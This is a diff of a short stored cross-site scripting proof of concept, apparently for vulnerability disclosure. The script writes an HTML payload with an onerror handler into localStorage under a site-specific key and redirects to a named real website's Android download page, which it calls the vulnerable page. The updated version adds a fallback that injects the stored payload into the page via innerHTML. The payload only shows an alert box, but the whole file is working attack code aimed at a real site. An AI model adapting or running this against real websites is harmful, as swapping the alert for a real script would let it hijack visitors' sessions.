@@ -1,20 +1,11 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Stored XSS PoC</title>
-    <script>
-      localStorage.setItem(
-        "ad333bae-5a0f-4221-9821-0399fb113a42-download",
-        `<img src=x onerror=alert('Stored XSS')>`
-      );
-      // Wait 1 second to ensure storage is saved
-      setTimeout(() => {
-        // Redirect to the vulnerable page
-        location.href = "https://www.ucweb.com/download/android";
-      }, 1000);
-    </script>
-  </head>
-  <body>
-    <h1>Setting up Stored XSS...</h1>
-  </body>
-</html>
+<script>
+localStorage.setItem("ad333bae-5a0f-4221-9821-0399fb113a42-download", `<img src="x" onerror="alert('Stored XSS')">`);
+location.href = "https://www.ucweb.com/download/android";
+
+// fallback for demo purposes
+setTimeout(() => {
+  try {
+    document.getElementById('root').innerHTML = localStorage.getItem("ad333bae-5a0f-4221-9821-0399fb113a42-download");
+  } catch(e) {}
+}, 3000);
+</script>
